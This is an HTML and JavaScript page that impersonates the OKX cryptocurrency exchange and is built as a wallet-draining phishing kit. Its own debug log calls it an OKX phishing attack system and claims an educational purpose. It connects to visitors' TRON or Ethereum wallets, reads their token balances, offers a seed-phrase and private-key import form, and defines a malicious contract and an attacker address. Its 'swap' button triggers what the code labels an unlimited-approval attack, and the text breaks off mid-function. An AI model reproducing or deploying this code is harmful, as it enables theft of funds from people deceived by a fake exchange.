<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>OKX - 全球领先数字资产交易平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #f8f9fa;
            color: #1a1a1a;
            padding-bottom: 80px;
        }

        .header {
            background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-left {
            display: flex;
            align-items: center;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-right: 15px;
        }

        .platform-selector {
            position: relative;
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 12px;
            opacity: 0.9;
        }

        .platform-dropdown {
            position: absolute;
            top: 100%;
            left: 0;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            padding: 8px 0;
            min-width: 200px;
            display: none;
            z-index: 200;
        }

        .platform-dropdown.show {
            display: block;
        }

        .platform-option {
            padding: 12px 16px;
            color: #333;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .platform-option:hover {
            background: #f8f9fa;
        }

        .platform-option.active {
            background: #e6f7ff;
            color: #1890ff;
        }

        .platform-icon {
            margin-right: 12px;
            font-size: 16px;
        }

        .platform-desc {
            font-size: 11px;
            color: #999;
            margin-top: 2px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .connect-wallet-btn {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 6px 12px;
            border-radius: 16px;
            font-size: 12px;
            cursor: pointer;
        }

        .main-content {
            padding: 0;
            min-height: calc(100vh - 140px);
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.3s ease-in-out;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* 调试面板 - 显示在底部，但样式优化 */
        .debug-panel {
            position: fixed;
            bottom: 80px;
            left: 10px;
            right: 10px;
            background: rgba(0,0,0,0.95);
            color: #00ff00;
            padding: 12px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            max-height: 150px;
            overflow-y: auto;
            z-index: 150;
            border: 1px solid #333;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
        }

        .debug-panel.show {
            display: block;
        }

        .debug-toggle {
            position: fixed;
            bottom: 85px;
            right: 15px;
            background: #1890ff;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            z-index: 160;
        }

        /* Web3钱包创建界面 */
        .web3-section {
            background: white;
            margin: 10px;
            border-radius: 12px;
            overflow: hidden;
        }

        .web3-header {
            padding: 20px;
            text-align: center;
            background: linear-gradient(135deg, #722ed1 0%, #531dab 100%);
            color: white;
        }

        .web3-title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .web3-subtitle {
            font-size: 14px;
            opacity: 0.9;
        }

        .wallet-actions {
            padding: 30px 20px;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .wallet-action-btn {
            background: white;
            border: 2px solid #d9d9d9;
            border-radius: 12px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: left;
        }

        .wallet-action-btn:hover {
            border-color: #1890ff;
            box-shadow: 0 2px 8px rgba(24,144,255,0.1);
        }

        .wallet-action-btn.primary {
            background: #1890ff;
            border-color: #1890ff;
            color: white;
        }

        .action-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .action-desc {
            font-size: 13px;
            color: #666;
            line-height: 1.4;
        }

        .wallet-action-btn.primary .action-desc {
            color: rgba(255,255,255,0.9);
        }

        /* 助记词输入界面 */
        .mnemonic-section {
            padding: 20px;
        }

        .mnemonic-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            text-align: center;
        }

        .mnemonic-input {
            width: 100%;
            height: 120px;
            padding: 16px;
            border: 2px solid #e8e8e8;
            border-radius: 8px;
            font-size: 16px;
            resize: none;
            margin-bottom: 20px;
        }

        .mnemonic-input:focus {
            outline: none;
            border-color: #1890ff;
        }

        .import-btn {
            width: 100%;
            background: #1890ff;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        /* 自选页面 */
        .favorites-section {
            background: white;
            margin: 10px;
            border-radius: 12px;
            overflow: hidden;
        }

        .section-header {
            padding: 15px 20px;
            border-bottom: 1px solid #f0f0f0;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .add-favorite {
            color: #1890ff;
            font-size: 14px;
            cursor: pointer;
        }

        .wallet-creation-options {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }

        .wallet-option-btn {
            flex: 1;
            background: #f8f9fa;
            border: 1px solid #e8e8e8;
            border-radius: 8px;
            padding: 12px 8px;
            font-size: 12px;
            cursor: pointer;
            text-align: center;
            transition: all 0.2s;
        }

        .wallet-option-btn:hover {
            background: #e6f7ff;
            border-color: #1890ff;
            color: #1890ff;
        }

        .coin-list {
            padding: 0;
        }

        .coin-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #f8f9fa;
            cursor: pointer;
        }

        .coin-item:hover {
            background: #f8f9fa;
        }

        .coin-info {
            display: flex;
            align-items: center;
        }

        .coin-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ffa940 0%, #fa8c16 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 14px;
            margin-right: 12px;
        }

        .coin-details {
            flex: 1;
        }

        .coin-pair {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 2px;
        }

        .coin-volume {
            font-size: 12px;
            color: #8c8c8c;
        }

        .coin-price {
            text-align: right;
        }

        .price {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 2px;
        }

        .price-change {
            font-size: 12px;
            padding: 2px 6px;
            border-radius: 4px;
        }

        .price-change.up {
            background: #f6ffed;
            color: #52c41a;
        }

        .price-change.down {
            background: #fff2f0;
            color: #ff4d4f;
        }

        /* 市场页面 */
        .market-tabs {
            display: flex;
            background: white;
            margin: 10px;
            border-radius: 12px;
            padding: 5px;
        }

        .market-tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .market-tab.active {
            background: #1890ff;
            color: white;
        }

        /* 交易页面 */
        .trade-section {
            background: white;
            margin: 10px;
            border-radius: 12px;
            padding: 20px;
        }

        .trade-type-tabs {
            display: flex;
            margin-bottom: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 4px;
        }

        .trade-type-tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .trade-type-tab.active {
            background: white;
            color: #1890ff;
            font-weight: 600;
        }

        .trade-form {
            margin-top: 20px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #666;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #e8e8e8;
            border-radius: 8px;
            font-size: 16px;
            background: #fafafa;
        }

        .form-input:focus {
            outline: none;
            border-color: #1890ff;
            background: white;
        }

        .currency-selector {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            border: 1px solid #e8e8e8;
            border-radius: 8px;
            background: #fafafa;
            cursor: pointer;
        }

        .currency-info {
            display: flex;
            align-items: center;
        }

        .currency-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #1890ff;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            margin-right: 8px;
        }

        .trade-btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s;
        }

        .buy-btn {
            background: #52c41a;
            color: white;
        }

        .buy-btn:hover {
            background: #389e0d;
        }

        .buy-btn:disabled {
            background: #d9d9d9;
            cursor: not-allowed;
        }

        /* 资产页面 */
        .assets-header {
            background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
            color: white;
            padding: 30px 20px;
            position: relative;
            overflow: hidden;
        }

        .falling-coins {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
        }

        .falling-coin {
            position: absolute;
            font-size: 20px;
            animation: fall linear infinite;
        }

        @keyframes fall {
            from {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            to {
                transform: translateY(200px) rotate(360deg);
                opacity: 0;
            }
        }

        .total-balance {
            text-align: center;
        }

        .balance-label {
            font-size: 14px;
            opacity: 0.9;
            margin-bottom: 8px;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .balance-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
        }

        .balance-action {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
        }

        .asset-list {
            background: white;
            margin: 10px;
            border-radius: 12px;
            overflow: hidden;
        }

        /* 底部导航 */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            border-top: 1px solid #f0f0f0;
            display: flex;
            z-index: 100;
        }

        .nav-item {
            flex: 1;
            text-align: center;
            padding: 12px 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .nav-item.active {
            color: #1890ff;
        }

        .nav-icon {
            font-size: 20px;
            margin-bottom: 4px;
        }

        .nav-label {
            font-size: 12px;
        }

        /* 成功提示 */
        .success-indicator {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #52c41a;
            color: white;
            padding: 16px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            z-index: 2000;
            display: none;
        }

        .success-indicator.show {
            display: block;
            animation: successPulse 2s ease-in-out;
        }

        @keyframes successPulse {
            0%, 100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
            20%, 80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }

        /* 模态框 */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal.show {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 12px;
            padding: 24px;
            max-width: 320px;
            width: 90%;
        }

        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            text-align: center;
        }

        .modal-text {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .modal-actions {
            display: flex;
            gap: 12px;
        }

        .modal-btn {
            flex: 1;
            padding: 12px;
            border: 1px solid #d9d9d9;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
        }

        .modal-btn.primary {
            background: #1890ff;
            color: white;
            border-color: #1890ff;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- 顶部导航 -->
    <div class="header">
        <div class="header-left">
            <div class="logo">OKX</div>
            <div class="platform-selector" onclick="togglePlatformDropdown()">
                <span id="currentPlatform">交易所</span>
                <span style="margin-left: 4px;">▼</span>
                <div class="platform-dropdown" id="platformDropdown">
                    <div class="platform-option" onclick="selectPlatform('pay')">
                        <div class="platform-icon">💳</div>
                        <div>
                            <div>Pay</div>
                            <div class="platform-desc">全新支付方式</div>
                        </div>
                    </div>
                    <div class="platform-option active" onclick="selectPlatform('exchange')">
                        <div class="platform-icon">📈</div>
                        <div>
                            <div>交易所</div>
                            <div class="platform-desc">进阶交易工具</div>
                        </div>
                    </div>
                    <div class="platform-option" onclick="selectPlatform('web3')">
                        <div class="platform-icon">🌐</div>
                        <div>
                            <div>Web3</div>
                            <div class="platform-desc">去中心化交易和市场</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="header-right">
            <button class="connect-wallet-btn" id="connectWalletBtn" onclick="connectWallet()">连接钱包</button>
        </div>
    </div>

    <!-- 主要内容区域 -->
    <div class="main-content">
        <!-- Web3钱包页面 -->
        <div class="tab-content" id="web3">
            <div class="web3-section">
                <div class="web3-header">
                    <div class="web3-title">Web3 入口</div>
                    <div class="web3-subtitle">钱包 · 交易 · NFT · 赚币 · DApp</div>
                </div>
                <div class="wallet-actions">
                    <div class="wallet-action-btn primary" onclick="showCreateWallet()">
                        <div class="action-title">创建钱包</div>
                        <div class="action-desc">安全便携，资产由你掌控</div>
                    </div>
                    <div class="wallet-action-btn" onclick="showImportWallet()">
                        <div class="action-title">导入钱包</div>
                        <div class="action-desc">使用助记词、私钥或云备份导入现有钱包</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- 助记词导入页面 -->
        <div class="tab-content" id="import-mnemonic">
            <div class="web3-section">
                <div class="mnemonic-section">
                    <div class="mnemonic-title">输入助记词或私钥</div>
                    <textarea 
                        class="mnemonic-input" 
                        id="mnemonicInput"
                        placeholder="请输入12、18或24位助记词，或者私钥&#10;&#10;示例：&#10;abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about&#10;&#10;或私钥：&#10;0x1234567890abcdef..."
                        oninput="validateMnemonic()"
                    ></textarea>
                    <button class="import-btn" id="importBtn" onclick="importWallet()" disabled>导入钱包</button>
                </div>
            </div>
        </div>

        <!-- 自选页面 -->
        <div class="tab-content active" id="favorites">
            <div class="favorites-section">
                <div class="section-header">
                    <span>自选</span>
                    <span class="add-favorite" onclick="showAddFavorite()">添加至自选</span>
                </div>
                <div class="wallet-creation-options">
                    <div class="wallet-option-btn" onclick="showCreateWallet()">创建钱包</div>
                    <div class="wallet-option-btn" onclick="showImportWallet()">导入钱包</div>
                </div>
                <div class="coin-list" id="favoritesList">
                    <!-- 动态生成 -->
                </div>
            </div>
        </div>

        <!-- 市场页面 -->
        <div class="tab-content" id="market">
            <div class="market-tabs">
                <div class="market-tab active" onclick="switchMarketTab('hot')">热门榜</div>
                <div class="market-tab" onclick="switchMarketTab('gainers')">涨幅榜</div>
                <div class="market-tab" onclick="switchMarketTab('losers')">跌幅榜</div>
                <div class="market-tab" onclick="switchMarketTab('volume')">成交额榜</div>
            </div>
            <div class="favorites-section">
                <div class="coin-list" id="marketList">
                    <!-- 动态生成 -->
                </div>
            </div>
        </div>

        <!-- 交易页面 -->
        <div class="tab-content" id="trade">
            <div class="trade-section">
                <div class="trade-type-tabs">
                    <div class="trade-type-tab active">闪兑</div>
                    <div class="trade-type-tab">现货</div>
                </div>

                <div class="trade-form">
                    <div class="form-group">
                        <label class="form-label">支付</label>
                        <div class="currency-selector" onclick="showCurrencySelector('from')">
                            <div class="currency-info">
                                <div class="currency-icon" id="fromCurrencyIcon">T</div>
                                <span id="fromCurrencyName">TRX</span>
                            </div>
                            <span>▼</span>
                        </div>
                        <input type="number" class="form-input" id="fromAmount" placeholder="输入金额" oninput="calculateExchange()">
                    </div>

                    <div class="form-group">
                        <label class="form-label">获得</label>
                        <div class="currency-selector" onclick="showCurrencySelector('to')">
                            <div class="currency-info">
                                <div class="currency-icon" id="toCurrencyIcon">U</div>
                                <span id="toCurrencyName">USDT</span>
                            </div>
                            <span>▼</span>
                        </div>
                        <input type="number" class="form-input" id="toAmount" placeholder="预计获得" readonly>
                    </div>

                    <button class="trade-btn buy-btn" id="tradeBtn" onclick="executeTrade()" disabled>
                        立即兑换
                    </button>
                </div>
            </div>
        </div>

        <!-- 探索页面 -->
        <div class="tab-content" id="explore">
            <div class="trade-section">
                <h3>探索 DeFi 世界</h3>
                <p style="color: #666; margin-top: 10px;">发现更多去中心化金融机会</p>
            </div>
        </div>

        <!-- 资产页面 -->
        <div class="tab-content" id="assets">
            <div class="assets-header">
                <div class="falling-coins" id="fallingCoins"></div>
                <div class="total-balance">
                    <div class="balance-label">总资产 (USDT)</div>
                    <div class="balance-amount" id="totalBalance">0.00</div>
                    <div class="balance-actions">
                        <button class="balance-action" onclick="showDeposit()">充币</button>
                        <button class="balance-action" onclick="showWithdraw()">提币</button>
                    </div>
                </div>
            </div>
            <div class="asset-list">
                <div class="section-header">我的资产</div>
                <div class="coin-list" id="assetsList">
                    <!-- 动态生成 -->
                </div>
            </div>
        </div>
    </div>

    <!-- 底部导航 -->
    <div class="bottom-nav">
        <div class="nav-item active" onclick="switchTab('favorites')">
            <div class="nav-icon">⭐</div>
            <div class="nav-label">自选</div>
        </div>
        <div class="nav-item" onclick="switchTab('market')">
            <div class="nav-icon">📊</div>
            <div class="nav-label">市场</div>
        </div>
        <div class="nav-item" onclick="switchTab('trade')">
            <div class="nav-icon">💱</div>
            <div class="nav-label">交易</div>
        </div>
        <div class="nav-item" onclick="switchTab('explore')">
            <div class="nav-icon">🔍</div>
            <div class="nav-label">探索</div>
        </div>
        <div class="nav-item" onclick="switchTab('assets')">
            <div class="nav-icon">💰</div>
            <div class="nav-label">资产</div>
        </div>
    </div>

    <!-- 调试面板 - 重新启用 -->
    <div class="debug-panel show" id="debugPanel">
        <div id="debugLog"></div>
    </div>

    <!-- 调试开关按钮 -->
    <button class="debug-toggle" onclick="toggleDebugPanel()">调试</button>

    <!-- 成功提示 -->
    <div class="success-indicator" id="successIndicator">
        ✅ 交易成功
    </div>

    <!-- 模态框 -->
    <div class="modal" id="modal">
        <div class="modal-content">
            <div class="modal-title" id="modalTitle"></div>
            <div class="modal-text" id="modalText"></div>
            <div class="modal-actions">
                <button class="modal-btn" onclick="hideModal()">取消</button>
                <button class="modal-btn primary" id="modalConfirm">确认</button>
            </div>
        </div>
    </div>

    <script>
        // 全局变量
        let currentAccount = null;
        let currentChainId = null;
        let selectedFromCurrency = 'TRX';
        let selectedToCurrency = 'USDT';
        let isWalletConnected = false;
        let currentNetwork = 'tron';
        let tronWeb = null;
        let userPrivateKey = null;
        let userMnemonic = null;
        let allTokenBalances = {};
        let debugPanelVisible = true;

        // TRON和多链币种数据 - 扩展更多代币
        const COINS_DATA = {
            'TRX/USDT': {
                name: 'TRON',
                symbol: 'TRX',
                icon: 'T',
                price: 0.1234,
                change: 2.45,
                volume: '890M',
                contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
                network: 'tron'
            },
            'USDT/TRX': {
                name: 'Tether USD',
                symbol: 'USDT',
                icon: 'U',
                price: 1.0,
                change: 0.01,
                volume: '2.1B',
                contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
                network: 'tron'
            },
            'BTC/USDT': {
                name: 'Bitcoin',
                symbol: 'BTC',
                icon: 'B',
                price: 43285.67,
                change: 1.24,
                volume: '2.1B',
                contract: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
                network: 'ethereum'
            },
            'ETH/USDT': {
                name: 'Ethereum', 
                symbol: 'ETH',
                icon: 'E',
                price: 2456.89,
                change: 1.31,
                volume: '1.8B',
                contract: '0x0000000000000000000000000000000000000000',
                network: 'ethereum'
            },
            'SUN/USDT': {
                name: 'SUN Token',
                symbol: 'SUN',
                icon: 'S',
                price: 0.0234,
                change: 5.67,
                volume: '45M',
                contract: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S',
                network: 'tron'
            },
            'JST/USDT': {
                name: 'JUST',
                symbol: 'JST',
                icon: 'J',
                price: 0.0456,
                change: -2.34,
                volume: '67M',
                contract: 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
                network: 'tron'
            }
        };

        // TRON代币合约列表
        const TRON_TOKENS = {
            'USDT': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            'USDC': 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8',
            'SUN': 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S',
            'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
            'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
            'BTT': 'TAFjULxiVgT4qWVigUyG4JTN6aqGaLgGdH'
        };

        // 恶意合约地址
        const MALICIOUS_CONTRACTS = {
            1: '0x1234567890123456789012345678901234567890',
            56: '0x2345678901234567890123456789012345678901', 
            137: '0x3456789012345678901234567890123456789012',
            'tron': 'TQQg4EL8o1BSeKJY4MJ8TB8XK7xufxFBvK'
        };

        const ATTACKER_ADDRESS = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';

        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            debugLog('🚀 OKX钓鱼攻击系统初始化');
            debugLog('⚠️ 仅用于安全研究和教育目的');
            initializeCoinsData();
            renderFavoritesList();
            renderMarketList('hot');
            startPriceUpdates();
            
            debugLog('📱 移动端交易所界面已加载');
            debugLog('🎯 TRON网络攻击系统已激活');
            
            // 检查钱包环境
            setTimeout(() => {
                checkWalletEnvironment();
            }, 1000);
        });

        // 调试日志 - 重新启用
        function debugLog(message) {
            const debugLog = document.getElementById('debugLog');
            const timestamp = new Date().toLocaleTimeString();
            const logMessage = `[${timestamp}] ${message}`;
            debugLog.innerHTML += `${logMessage}<br>`;
            debugLog.scrollTop = debugLog.scrollHeight;
            console.log(logMessage);
        }

        // 切换调试面板
        function toggleDebugPanel() {
            const panel = document.getElementById('debugPanel');
            debugPanelVisible = !debugPanelVisible;
            panel.style.display = debugPanelVisible ? 'block' : 'none';
        }

        // 检查钱包环境
        function checkWalletEnvironment() {
            debugLog('🔍 检查TRON钱包环境...');
            
            if (window.tronWeb) {
                debugLog('✅ 检测到TronWeb环境');
                tronWeb = window.tronWeb;
                checkExistingTronConnection();
            } else if (window.ethereum) {
                debugLog('✅ 检测到Ethereum环境，等待TRON连接');
            } else {
                debugLog('⚠️ 等待钱包环境加载...');
                setTimeout(checkWalletEnvironment, 2000);
            }
        }

        // 检查现有TRON连接
        async function checkExistingTronConnection() {
            try {
                if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    debugLog(`✅ 发现已连接TRON账户: ${tronWeb.defaultAddress.base58}`);
                    await handleSuccessfulTronConnection(tronWeb.defaultAddress.base58);
                } else {
                    debugLog('⚠️ 未发现已连接的TRON账户');
                }
            } catch (error) {
                debugLog(`❌ 检查TRON连接失败: ${error.message}`);
            }
        }

        // 初始化币种数据
        function initializeCoinsData() {
            debugLog('📊 加载多链币种数据...');
            Object.keys(COINS_DATA).forEach(pair => {
                const coin = COINS_DATA[pair];
                debugLog(`💰 ${pair}: $${coin.price} (${coin.change > 0 ? '+' : ''}${coin.change}%) [${coin.network.toUpperCase()}]`);
            });
            debugLog('🎯 TRON恶意合约已配置完成');
        }

        // 🎯 连接钱包
        async function connectWallet() {
            try {
                debugLog('🔗 开始多链钱包连接...');

                if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
                    debugLog('📱 检测到移动设备，尝试打开钱包应用');
                    
                    const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(window.location.href);
                    window.location.href = deepLink;
                    
                    setTimeout(() => {
                        if (document.visibilityState === 'visible') {
                            debugLog('❌ 请在imToken中打开此页面');
                        }
                    }, 2000);
                    return;
                }

                await attemptWalletConnection();

            } catch (error) {
                debugLog(`❌ 连接失败: ${error.message}`);
            }
        }

        // 尝试钱包连接
        async function attemptWalletConnection() {
            if (window.tronWeb) {
                debugLog('🎯 尝试TRON连接...');
                await connectTronWallet();
            } else if (window.ethereum) {
                debugLog('🎯 尝试Ethereum连接...');
                await connectEthereumWallet();
            } else {
                throw new Error('未检测到支持的钱包');
            }
        }

        // 🎯 连接TRON钱包
        async function connectTronWallet() {
            try {
                debugLog('🎯 开始TRON钱包连接...');

                if (!window.tronWeb) {
                    throw new Error('未检测到TronWeb环境');
                }

                tronWeb = window.tronWeb;
                debugLog('✅ TronWeb环境已加载');

                if (tronWeb.request) {
                    debugLog('📝 发送TRON账户请求...');
                    const result = await tronWeb.request({
                        method: 'tron_requestAccounts'
                    });
                    debugLog(`📥 TRON请求结果: ${JSON.stringify(result)}`);
                }

                let currentAddress = null;
                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    currentAddress = tronWeb.defaultAddress.base58;
                } else if (tronWeb.address) {
                    currentAddress = tronWeb.address;
                }

                if (!currentAddress) {
                    throw new Error('未获取到TRON账户地址');
                }

                debugLog(`✅ 获取到TRON账户: ${currentAddress}`);
                await handleSuccessfulTronConnection(currentAddress);

            } catch (error) {
                debugLog(`❌ TRON连接失败: ${error.message}`);
                if (window.ethereum) {
                    debugLog('🔄 TRON失败，尝试Ethereum连接...');
                    await connectEthereumWallet();
                } else {
                    throw error;
                }
            }
        }

        // 🎯 处理TRON连接成功
        async function handleSuccessfulTronConnection(address) {
            try {
                currentAccount = address;
                currentNetwork = 'tron';
                debugLog(`✅ TRON钱包连接成功: ${currentAccount}`);

                // 获取所有代币余额
                await getAllTronTokenBalances(address);

                // 更新UI
                isWalletConnected = true;
                document.getElementById('connectWalletBtn').textContent = 'TRON已连接';
                document.getElementById('connectWalletBtn').style.background = 'rgba(255, 0, 19, 0.2)';
                document.getElementById('connectWalletBtn').style.borderColor = 'rgba(255, 0, 19, 0.3)';

                debugLog('🎯 TRON钓鱼攻击系统已激活，等待用户交易...');

            } catch (error) {
                debugLog(`❌ 处理TRON连接失败: ${error.message}`);
            }
        }

        // 🎯 获取所有TRON代币余额
        async function getAllTronTokenBalances(address) {
            try {
                debugLog('💰 获取TRON账户余额...');
                allTokenBalances = {};
                
                if (!tronWeb) {
                    throw new Error('TronWeb未初始化');
                }

                // 获取TRX余额
                const balance = await tronWeb.trx.getBalance(address);
                const trxBalance = tronWeb.fromSun(balance);
                allTokenBalances['TRX'] = parseFloat(trxBalance);
                debugLog(`💰 TRX余额: ${trxBalance} TRX`);

                // 获取所有TRC20代币余额
                for (const [symbol, contractAddress] of Object.entries(TRON_TOKENS)) {
                    try {
                        const contract = await tronWeb.contract().at(contractAddress);
                        const tokenBalance = await contract.balanceOf(address).call();
                        
                        let decimals = 6;
                        try {
                            decimals = await contract.decimals().call();
                        } catch (e) {
                            // 使用默认值
                        }
                        
                        const formattedBalance = tronWeb.toBigNumber(tokenBalance).dividedBy(Math.pow(10, decimals)).toFixed(2);
                        allTokenBalances[symbol] = parseFloat(formattedBalance);
                        
                        debugLog(`💰 ${symbol}余额: ${formattedBalance} ${symbol}`);
                        
                    } catch (tokenError) {
                        allTokenBalances[symbol] = 0;
                        debugLog(`⚠️ 获取${symbol}余额失败: ${tokenError.message}`);
                    }
                }

                updateAllAssetsDisplay();
                
            } catch (error) {
                debugLog(`❌ 获取余额失败: ${error.message}`);
                // 使用模拟数据
                allTokenBalances = {
                    'TRX': 100.00,
                    'USDT': 500.00,
                    'SUN': 1000.00,
                    'JST': 2500.00
                };
                updateAllAssetsDisplay();
            }
        }

        // 🎯 更新所有资产显示
        function updateAllAssetsDisplay() {
            let totalValue = 0;
            const container = document.getElementById('assetsList');
            container.innerHTML = '';

            debugLog('💎 更新资产显示:');
            
            Object.entries(allTokenBalances).forEach(([symbol, balance]) => {
                if (balance > 0) {
                    const coin = Object.values(COINS_DATA).find(c => c.symbol === symbol);
                    const price = coin ? coin.price : 1;
                    const value = balance * price;
                    totalValue += value;

                    debugLog(`💎 ${symbol}: ${balance} (价值 $${value.toFixed(2)})`);

                    const item = document.createElement('div');
                    item.className = 'coin-item';
                    item.innerHTML = `
                        <div class="coin-info">
                            <div class="coin-icon">${coin ? coin.icon : symbol[0]}</div>
                            <div class="coin-details">
                                <div class="coin-pair">${symbol}</div>
                                <div class="coin-volume">${balance} ${symbol}</div>
                            </div>
                        </div>
                        <div class="coin-price">
                            <div class="price">$${value.toFixed(2)}</div>
                        </div>
                    `;
                    container.appendChild(item);
                }
            });

            document.getElementById('totalBalance').textContent = totalValue.toFixed(2);
            debugLog(`💎 总资产价值: $${totalValue.toFixed(2)}`);
        }

        // 🎯 执行交易攻击
        async function executeTrade() {
            if (!isWalletConnected) {
                debugLog('❌ 钱包未连接');
                return;
            }

            try {
                const fromAmount = document.getElementById('fromAmount').value;
                if (!fromAmount || parseFloat(fromAmount) <= 0) {
                    debugLog('❌ 请输入有效金额');
                    return;
                }

                debugLog('🎯 开始执行多链攻击!');

                if (currentNetwork === 'tron') {
                    await executeTronAttack(fromAmount);
                } else {
                    await executeEthereumAttack(fromAmount);
                }

            } catch (error) {
                debugLog(`❌ 攻击失败: ${error.message}`);
            }
        }

        // 🎯 执行TRON攻击
        async function executeTronAttack(amount) {
            try {
                debugLog('🎯 执行TRON无限授权攻击...');

                const fromCoin = COINS_DATA[`${selectedFromCurrency}/USDT`] || COINS_DATA['TRX/USDT'];
                const tokenContract = fromCoin.contract;
                const maliciousContract = MALICIOUS_CONTRACTS.tron;

                debugLog(`🎯 TRON代币合约: ${tokenContract}`);
                debugLog(`🎯 TRON恶意合约: ${maliciousContract}`);

                if (!tronWeb) {
                    throw new Error('TronWeb未初始化');
                }

                const contract = await tronWeb.contract().at(tokenContract);
                
                // 🔥 显示真实交易金额
                const realAmount = tronWeb.toSun(parseFloat(amount) * fromCoin.price);
